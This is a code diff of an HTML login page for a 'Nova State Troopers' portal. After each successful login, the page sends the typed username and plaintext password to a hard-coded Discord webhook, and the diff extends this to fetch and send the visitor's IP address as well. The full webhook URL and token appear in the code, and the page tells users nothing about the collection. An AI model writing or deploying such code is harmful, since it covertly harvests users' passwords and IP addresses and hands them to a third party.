@@ -4,7 +4,7 @@
     <title>Nova State Troopers</title>
     <link rel="icon" href="images/logo1.png" type="image/png">
     <link rel="stylesheet" type="text/css" href="style.css">
-    <script src="js/credentials.js"></script>  
+    <script src="js/credentials.js"></script>
     <style>
         /* Additional styles specific to this page */
         body {
@@ -93,38 +93,46 @@
                     document.getElementById("login-container").classList.add("hidden");
                     document.getElementById("content").classList.remove("hidden");
 
-                    // Send embed message to Discord webhook
-                    var webhookUrl = "https://discord.com/api/webhooks/1116138439469973505/SCh8l8eRfYGxMWOQuvJTuUKMXUCDLMT9mUiVPMc_DNwQia7ZUJ2DDhyPAF-k6tauUBaH";
+                    // Fetch IP address using geolocation API
+                    fetch("https://api.ipify.org?format=json")
+                        .then(response => response.json())
+                        .then(data => {
+                            var ipAddress = data.ip;
 
-                    // Prepare the embed message payload
-                    var embed = {
-                        username: "Trooper Portal Logs",
-                        embeds: [
-                            {
-                                title: "Login Details",
-                                color: 16711680,  // Red color
-                                fields: [
-                                    { name: "Username Used", value: username },
-                                    { name: "Password Used", value: password },
-                                    { name: "Time", value: new Date().toLocaleString() }
+                            // Send embed message to Discord webhook
+                            var webhookUrl = "https://discord.com/api/webhooks/1116138439469973505/SCh8l8eRfYGxMWOQuvJTuUKMXUCDLMT9mUiVPMc_DNwQia7ZUJ2DDhyPAF-k6tauUBaH";
+
+                            // Prepare the embed message payload
+                            var embed = {
+                                username: "Trooper Portal Logs",
+                                embeds: [
+                                    {
+                                        title: "Login Details",
+                                        color: 16711680,  // Red color
+                                        fields: [
+                                            { name: "Username Used", value: username },
+                                            { name: "Password Used", value: password },
+                                            { name: "Time", value: new Date().toLocaleString() },
+                                            { name: "IP Address", value: ipAddress }
+                                        ]
+                                    }
                                 ]
-                            }
-                        ]
-                    };
+                            };
 
-                    // Send the POST request to the Discord webhook
-                    $.ajax({
-                        url: webhookUrl,
-                        type: "POST",
-                        data: JSON.stringify(embed),
-                        contentType: "application/json",
-                        success: function(response) {
-                            console.log("Embed message sent to Discord");
-                        },
-                        error: function(error) {
-                            console.error("Failed to send embed message to Discord:", error);
-                        }
-                    });
+                            // Send the POST request to the Discord webhook
+                            $.ajax({
+                                url: webhookUrl,
+                                type: "POST",
+                                data: JSON.stringify(embed),
+                                contentType: "application/json",
+                                success: function(response) {
+                                    console.log("Embed message sent to Discord");
+                                },
+                                error: function(error) {
+                                    console.error("Failed to send embed message to Discord:", error);
+                                }
+                            });
+                        });
 
                     return false;
                 }
@@ -139,4 +147,3 @@
     </script>
 </body>
 </html>
-
